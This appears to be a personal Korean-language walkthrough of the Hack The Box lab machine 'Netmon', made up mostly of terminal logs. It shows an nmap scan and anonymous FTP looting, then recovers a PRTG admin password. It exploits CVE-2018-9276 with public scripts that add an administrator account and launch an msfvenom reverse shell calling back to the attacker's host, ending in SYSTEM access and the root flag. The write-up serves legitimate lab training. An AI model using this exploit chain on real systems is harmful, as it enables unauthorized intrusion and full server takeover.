```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sCV -p- -Pn -A --min-rate 5000 10.129.230.176 -oN 10.129.230.176.log       
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-02 15:57 +0900
Stats: 0:01:10 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 53.85% done; ETC: 15:59 (0:00:45 remaining)
Nmap scan report for 10.129.230.176
Host is up (0.27s latency).
Not shown: 65522 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-02-19  11:18PM                 1024 .rnd
| 02-25-19  09:15PM       <DIR>          inetpub
| 07-16-16  08:18AM       <DIR>          PerfLogs
| 02-25-19  09:56PM       <DIR>          Program Files
| 02-02-19  11:28PM       <DIR>          Program Files (x86)
| 02-03-19  07:08AM       <DIR>          Users
|_11-10-23  09:20AM       <DIR>          Windows
80/tcp    open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-server-header: PRTG/18.1.37.13946
|_http-trane-info: Problem with XML parsing of /evox/about
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
Device type: general purpose
Running: Microsoft Windows 2016
OS CPE: cpe:/o:microsoft:windows_server_2016
OS details: Microsoft Windows Server 2016
Network Distance: 2 hops
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2026-02-02T06:58:47
|_  start_date: 2026-02-02T06:34:31

TRACEROUTE (using port 111/tcp)
HOP RTT       ADDRESS
1   274.76 ms 10.10.14.1
2   275.13 ms 10.129.230.176

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 93.53 seconds
                                                             
```

anonymous 계정으로 user.txt 파일 획득
![[Pasted image 20260202162736.png]]
![[Pasted image 20260202162746.png]]


```ftp
mget **
```

PRTG Configuration.old.bak 파일 내 password 확인

![[Pasted image 20260203105113.png]]

확인된 password 입력 시 로그인 실패
2018 -> 2019로 변경 시 로그인 성공
![[Pasted image 20260203105428.png]]



poc 


![[Pasted image 20260203111401.png]]

```bash
./46527.sh  ./46527.sh-u http://10.10.10.10 -c "_ga=GA1.4.1322527023.1770017596; _gid=GA1.4.1568900133.1770017596; OCTOPUS1813713946=ezQwRkY1QkI3LTRCODEtNDMyRi05RDU0LUQxMTI5NUIxRTk0Mn0%3D; _gat=1"
```
```bash
┌──(kali㉿kali)-[~/HTB/Netmon]
└─$ ./46527.sh  ./46527.sh-u http://10.10.10.10 -c "_ga=GA1.4.1322527023.1770017596; _gid=GA1.4.1568900133.1770017596; OCTOPUS1813713946=ezQwRkY1QkI3LTRCODEtNDMyRi05RDU0LUQxMTI5NUIxRTk0Mn0%3D; _gat=1"

[+]#########################################################################[+] 
[*] Authenticated PRTG network Monitor remote code execution                [*] 
[+]#########################################################################[+] 
[*] Date: 11/03/2019                                                        [*] 
[+]#########################################################################[+] 
[*] Author: https://github.com/M4LV0   lorn3m4lvo@protonmail.com            [*] 
[+]#########################################################################[+] 
[*] Vendor Homepage: https://www.paessler.com/prtg                          [*] 
[*] Version: 18.2.38                                                        [*] 
[*] CVE: CVE-2018-9276                                                      [*] 
[*] Reference: https://www.codewatch.org/blog/?p=453                        [*] 
[+]#########################################################################[+] 

# login to the app, default creds are prtgadmin/prtgadmin. once athenticated grab your cookie and use it with the script.                                                                                                             
# run the script to create a new user 'pentest' in the administrators group with password 'P3nT3st!'               

[+]#########################################################################[+] 

 [*] file created 
 [*] sending notification wait....

 [*] adding a new user 'pentest' with password 'P3nT3st' 
 [*] sending notification wait....

 [*] adding a user pentest to the administrators group 
 [*] sending notification wait....


 [*] exploit completed new user 'pentest' with password 'P3nT3st!' created have fun! 


```


POC Download
https://github.com/A1vinSmith/CVE-2018-9276/tree/main?source=post_page-----9b6649f1c449---------------------------------------


```bash
┌──(kali㉿kali)-[~/HTB/Netmon/CVE-2018-9276]
└─$ python3 exploit.py -i 10.129.230.176 -p 80 --lhost 10.10.15.161 --lport 4444 --user prtgadmin --password PrTg@dmin2019
/home/kali/HTB/Netmon/CVE-2018-9276/exploit.py:259: SyntaxWarning: invalid escape sequence '\{'
  print(event + "Hosting payload at [\\\\{}\{}]".format(lhost, shareName))
[+] [PRTG/18.1.37.13946] is Vulnerable!

[*] Exploiting [10.129.230.176:80] as [prtgadmin/PrTg@dmin2019]
[+] Session obtained for [prtgadmin:PrTg@dmin2019]
[+] File staged at [C:\Users\Public\tester.txt] successfully with objid of [2018]
[+] Session obtained for [prtgadmin:PrTg@dmin2019]
[+] Notification with objid [2018] staged for execution
[*] Generate msfvenom payload with [LHOST=10.10.15.161 LPORT=4444 OUTPUT=/tmp/ggxlswft.dll]
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of dll file: 9216 bytes
/home/kali/HTB/Netmon/CVE-2018-9276/exploit.py:294: DeprecationWarning: setName() is deprecated, set the name attribute instead
  impacket.setName('Impacket')
/home/kali/HTB/Netmon/CVE-2018-9276/exploit.py:295: DeprecationWarning: setDaemon() is deprecated, set the daemon attribute instead
  impacket.setDaemon(True)
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Hosting payload at [\\10.10.15.161\GHIARXFI]
[+] Session obtained for [prtgadmin:PrTg@dmin2019]
[+] Command staged at [C:\Users\Public\tester.txt] successfully with objid of [2019]
[+] Session obtained for [prtgadmin:PrTg@dmin2019]
[+] Notification with objid [2019] staged for execution
[*] Attempting to kill the impacket thread
[-] Impacket will maintain its own thread for active connections, so you may find it''s still listening on <LHOST>:445!
[-] ps aux | grep <script name> and kill -9 <pid> if it is still running :)
[-] The connection will eventually time out.

[+] Listening on [10.10.15.161:4444 for the reverse shell!]
listening on [any] 4444 ...
[*] Incoming connection (10.129.230.176,53763)
[*] AUTHENTICATE_MESSAGE (\,NETMON)
[*] User NETMON\ authenticated successfully
[*] :::00::aaaaaaaaaaaaaaaa
connect to [10.10.15.161] from (UNKNOWN) [10.129.230.176] 53766
Microsoft Windows [Version 10.0.14393][*] Disconnecting Share(1:IPC$)

(c) 2016 Microsoft Corporation. All rights reserved.
C:\Windows\system32>
```


system 계정 접근 후 flag 획득
```powershell
C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>type c:\users\administrator\desktop\root.txt
type c:\users\administrator\desktop\root.txt
c8e2e4226bd42f9f0d28b1c786017f07

C:\Windows\system32>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : .htb
   IPv6 Address. . . . . . . . . . . : dead:beef::d4cb:94a1:f9a2:1b92
   Link-local IPv6 Address . . . . . : fe80::d4cb:94a1:f9a2:1b92%3
   IPv4 Address. . . . . . . . . . . : 10.129.230.176
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:fe94:9b51%3
                                       10.129.0.1

Tunnel adapter isatap..htb:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : .htb


```





```jsx
┌──(kali㉿kali)-[~]
└─$ ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.164.128  netmask 255.255.255.0  broadcast 192.168.164.255
        inet6 fe80::c213:5886:f33f:91be  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:35:39:20  txqueuelen 1000  (Ethernet)
        RX packets 77522  bytes 14814618 (14.1 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 88823  bytes 14030306 (13.3 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 116  bytes 8992 (8.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 116  bytes 8992 (8.7 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.10.15.161  netmask 255.255.254.0  destination 10.10.15.161
        inet6 dead:beef:2::119f  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::2ef3:1a4c:a264:6a78  prefixlen 64  scopeid 0x20<link>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 11  bytes 528 (528.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

```
